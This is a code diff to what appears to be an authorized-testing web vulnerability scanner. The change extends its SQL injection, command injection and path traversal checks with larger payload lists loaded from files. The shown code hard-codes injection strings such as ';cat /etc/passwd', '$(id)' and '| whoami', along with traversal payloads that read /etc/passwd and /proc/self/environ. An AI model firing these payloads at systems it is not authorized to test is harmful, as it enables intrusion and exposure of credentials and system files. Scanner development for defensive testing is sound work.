@@ -26,13 +26,16 @@ def _set_param(base_url: str, path: str, param: str, value: str, extra: dict | N
 
 
 def _load_payloads(payloads_dir: str, name: str, limit: int = 8) -> list[str]:
+    """Load payloads from payloads/web/<name>, skipping comments, de-duplicated, up to `limit`."""
     path = os.path.join(payloads_dir, "web", name)
     out: list[str] = []
+    seen: set[str] = set()
     try:
         with open(path, encoding="utf-8") as fh:
             for line in fh:
                 s = line.rstrip("\n")
-                if s and not s.startswith("#") and not s.startswith("##"):
+                if s and not s.startswith("#") and s not in seen:
+                    seen.add(s)
                     out.append(s)
                 if len(out) >= limit:
                     break
@@ -44,11 +47,15 @@ def _load_payloads(payloads_dir: str, name: str, limit: int = 8) -> list[str]:
 class WebScanner:
     name = "web-scanner (native)"
 
-    def __init__(self, http: HttpClient, log: AuditLogger, guard: ScopeGuard, payloads_dir: str):
+    def __init__(self, http: HttpClient, log: AuditLogger, guard: ScopeGuard, payloads_dir: str,
+                 payload_limit: int | None = None):
         self.http = http
         self.log = log
         self.guard = guard
         self.payloads_dir = payloads_dir
+        # how many payloads to try from the big consolidated *-fuzz.txt sets (early-exit on hit)
+        self.payload_limit = payload_limit if payload_limit is not None \
+            else int(os.environ.get("BEZ_PAYLOAD_LIMIT", "1200"))
 
     def scan(self, target: Target, seeds: list[tuple[str, str]]) -> list[Finding]:
         """seeds: list of (path, parameter_name) to test."""
@@ -119,8 +126,10 @@ class WebScanner:
     def _sqli(self, base: str, path: str, param: str) -> list[Finding]:
         out: list[Finding] = []
         # 1) error-based: try numeric AND string/quote contexts (single/double quote, closing paren)
-        self.log.action(base, self.name, f"SQLi probe {path}?{param}")
-        for probe in ["1'", "'", "\"", "1\"", "')", "1')", "1`"]:
+        probes = ["1'", "'", "\"", "1\"", "')", "1')", "1`"] + \
+            _load_payloads(self.payloads_dir, "sqli-fuzz.txt", self.payload_limit)
+        self.log.action(base, self.name, f"SQLi probe {path}?{param} ({len(probes)} payloads)")
+        for probe in probes:
             url = _set_param(base, path, param, probe)
             r = self.http.get(url)
             sig = det.sql_error(r.text)
@@ -267,7 +276,8 @@ class WebScanner:
             "127.0.0.1;id", "127.0.0.1| id", "1;id", "; id", "| id", "|| id", "&& id",
             "`id`", "$(id)", "1\nid", "%0aid", ";cat /etc/passwd", "|cat /etc/passwd",
             "& whoami", "| whoami", ";${IFS}id",
-        ]
+        ] + _load_payloads(self.payloads_dir, "cmdi-fuzz.txt", self.payload_limit)
+        self.log.action(base, self.name, f"CMDi {path}?{param} ({len(payloads)} payloads)")
         for p in payloads:
             url = _set_param(base, path, param, p)
             r = self.http.get(url)
@@ -289,12 +299,15 @@ class WebScanner:
         out: list[Finding] = []
         deep = "../" * 14
         winup = "..\\" * 14
-        for p in [deep + "etc/passwd", "..%2f" * 14 + "etc%2fpasswd",
+        inline = [deep + "etc/passwd", "..%2f" * 14 + "etc%2fpasswd",
                   "....//" * 14 + "etc/passwd", "../../../../../../etc/passwd",
                   deep + "etc/passwd%00", "%2e%2e%2f" * 14 + "etc%2fpasswd",
                   "php://filter/convert.base64-encode/resource=/etc/passwd",
                   "/proc/self/environ", "file:///etc/passwd",
-                  winup + "windows\\win.ini", deep + "windows/win.ini"]:
+                  winup + "windows\\win.ini", deep + "windows/win.ini"]
+        payloads = inline + _load_payloads(self.payloads_dir, "lfi-fuzz.txt", self.payload_limit)
+        self.log.action(base, self.name, f"Traversal {path}?{param} ({len(payloads)} payloads)")
+        for p in payloads:
             url = _set_param(base, path, param, p)
             r = self.http.get(url)
             sig = det.traversal_ok(r.text)
